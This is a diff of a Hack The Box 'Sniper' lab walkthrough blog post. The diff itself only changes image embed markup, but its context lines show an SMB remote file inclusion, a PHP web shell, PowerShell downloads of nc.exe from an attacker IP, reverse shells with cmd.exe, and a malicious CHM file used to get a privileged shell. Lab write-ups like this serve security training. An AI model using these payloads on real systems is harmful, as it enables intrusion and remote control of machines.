@@ -64,9 +64,9 @@ PORT    STATE SERVICE       REASON          VERSION
 
 Seems pretty water-tight to me. Also, it appears that the `http` service is the only way to go. Hers's how it looks like.
 
-<a class="image-popup">
-![119c0bd3.png](/assets/images/posts/sniper-htb-walkthrough/119c0bd3.png)
-</a>
+
+{% include image.html image_alt="119c0bd3.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/119c0bd3.png" %}
+
 
 Looks good.
 
@@ -109,29 +109,29 @@ There are two directories of interest: `/blog` and `/user`.
 
 _`/blog`_
 
-<a class="image-popup">
-![988dff51.png](/assets/images/posts/sniper-htb-walkthrough/988dff51.png)
-</a>
+
+{% include image.html image_alt="988dff51.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/988dff51.png" %}
+
 
 _`/user`_
 
-<a class="image-popup">
-![9865b1f5.png](/assets/images/posts/sniper-htb-walkthrough/9865b1f5.png)
-</a>
+
+{% include image.html image_alt="9865b1f5.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/9865b1f5.png" %}
+
 
 ### File Inclusion Vulnerability
 
 A file inclusion vulnerability was quickly spotted in the `lang` parameter of `/blog/index.php`.
 
-<a class="image-popup">
-![d563d6cc.png](/assets/images/posts/sniper-htb-walkthrough/d563d6cc.png)
-</a>
+
+{% include image.html image_alt="d563d6cc.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/d563d6cc.png" %}
+
 
 The file `blog-en.php` is present.
 
-<a class="image-popup">
-![616da67e.png](/assets/images/posts/sniper-htb-walkthrough/616da67e.png)
-</a>
+
+{% include image.html image_alt="616da67e.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/616da67e.png" %}
+
 
 Long story short. I verified that remote file inclusion attack doesn't work for HTTP. Maybe it'll work for SMB? With that in mind, let's set up a public share with Samba.
 
@@ -166,9 +166,9 @@ Let's put in the following file in that share and start the service.
 echo '<?php phpinfo(); ?>' > info.php && systemctl start smbd
 ```
 
-<a class="image-popup">
-![e6415fb0.png](/assets/images/posts/sniper-htb-walkthrough/e6415fb0.png)
-</a>
+
+{% include image.html image_alt="e6415fb0.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/e6415fb0.png" %}
+
 
 Awesome!
 
@@ -182,9 +182,9 @@ We should now be able to put in another PHP file that executes commands remotely
 <?php echo shell_exec($_GET[0]); ?>
 ```
 
-<a class="image-popup">
-![62f39630.png](/assets/images/posts/sniper-htb-walkthrough/62f39630.png)
-</a>
+
+{% include image.html image_alt="62f39630.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/62f39630.png" %}
+
 
 And because there's HTML mixed inside the output, I wrote a simple bash script to tidy up the output.
 
@@ -204,9 +204,9 @@ curl -s \
 | head -n -3
 ```
 
-<a class="image-popup">
-![f53edaf5.png](/assets/images/posts/sniper-htb-walkthrough/f53edaf5.png)
-</a>
+
+{% include image.html image_alt="f53edaf5.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/f53edaf5.png" %}
+
 
 See? So much neater! Now, let's see how we can get a reverse shell. I used the following command to download a copy of `nc.exe` from Kali Linux to `C:\Windows\System32\spool\drivers\color`.
 
@@ -214,9 +214,9 @@ See? So much neater! Now, let's see how we can get a reverse shell. I used the f
 # ./tidy.sh 'powershell /c iwr http://10.10.15.171/nc.exe -outf \windows\system32\spool\drivers\color\cute.exe'
 ```
 
-<a class="image-popup">
-![773212b4.png](/assets/images/posts/sniper-htb-walkthrough/773212b4.png)
-</a>
+
+{% include image.html image_alt="773212b4.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/773212b4.png" %}
+
 
 Sweet. It's there. Let's get our reverse shell.
 
@@ -224,9 +224,9 @@ Sweet. It's there. Let's get our reverse shell.
 # ./tidy.sh 'start \windows\system32\spool\drivers\color\cute.exe 10.10.15.171 1234 -e cmd.exe'
 ```
 
-<a class="image-popup">
-![a45965d7.png](/assets/images/posts/sniper-htb-walkthrough/a45965d7.png)
-</a>
+
+{% include image.html image_alt="a45965d7.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/a45965d7.png" %}
+
 
 There you have it.
 
@@ -234,9 +234,9 @@ There you have it.
 
 During enumeration of the `iusr` account, I found the password of `Chris` in `C:\inetpub\wwwroot\user\db.php`. And guesss what, `Chris` is able to perform PowerShell Remoting.
 
-<a class="image-popup">
-![022b35d8.png](/assets/images/posts/sniper-htb-walkthrough/022b35d8.png)
-</a>
+
+{% include image.html image_alt="022b35d8.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/022b35d8.png" %}
+
 
 Armed with the credentials of Chris, I can get myself a reverse shell as `Chris` and no surprise, the file `user.txt` in in `Chris`'s desktop.
 
@@ -251,17 +251,17 @@ But how, I hear you asking. Well, like this.
 > Start-Process -FilePath "\windows\system32\spool\drivers\color\cute.exe" -ArgumentList "10.10.15.171 4321 -e cmd.exe" -NoNewWindow
 ```
 
-<a class="image-popup">
-![8bb702a1.png](/assets/images/posts/sniper-htb-walkthrough/8bb702a1.png)
-</a>
+
+{% include image.html image_alt="8bb702a1.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/8bb702a1.png" %}
+
 
 ### Getting `root.txt`
 
 During enumeration of `Chris`'s account, I saw an `instructions.chm` lamenting the life of a developer and an evil boss like so.
 
-<a class="image-popup">
-![455f2f0d.png](/assets/images/posts/sniper-htb-walkthrough/455f2f0d.png)
-</a>
+
+{% include image.html image_alt="455f2f0d.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/455f2f0d.png" %}
+
 
 There's also another` note.txt` that depicts a boss who has a rather low opinion of Chris.
 
@@ -277,9 +277,9 @@ I did an experiment. I copied `instructions.chm` and dropped it into `C:\Docs`. 
 
 I extracted `a.html` from `instructions.chm`, modified it, and using `hhc.exe` (Microsoft HTML Help Workshop and Documentation), I was able to compile my malicious CHM file.
 
-<a class="image-popup">
-![9459d742.png](/assets/images/posts/sniper-htb-walkthrough/9459d742.png)
-</a>
+
+{% include image.html image_alt="9459d742.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/9459d742.png" %}
+
 
 <div class="filename"><span>a.html</span></div>
 
@@ -318,9 +318,9 @@ C:\Users\bernard\Downloads\a.html
 
 Let's compile it.
 
-<a class="image-popup">
-![3e1f63f1.png](/assets/images/posts/sniper-htb-walkthrough/3e1f63f1.png)
-</a>
+
+{% include image.html image_alt="3e1f63f1.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/3e1f63f1.png" %}
+
 
 Time to drop the file into `C:\Docs`.
 
@@ -330,15 +330,15 @@ PS C:\Docs> iwr http://10.10.15.171/evil.chm -outf .\instructions.chm
 
 Seconds later, a reverse shell with power appear...
 
-<a class="image-popup">
-![1468d8cf.png](/assets/images/posts/sniper-htb-walkthrough/1468d8cf.png)
-</a>
+
+{% include image.html image_alt="1468d8cf.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/1468d8cf.png" %}
+
 
 Getting `root.txt` is trivial.
 
-<a class="image-popup">
-![1e500d4c.png](/assets/images/posts/sniper-htb-walkthrough/1e500d4c.png)
-</a>
+
+{% include image.html image_alt="1e500d4c.png" image_src="/07c0d229-f98c-4f6c-90ce-0757ee398b6b/1e500d4c.png" %}
+
 
 :dancer:
 
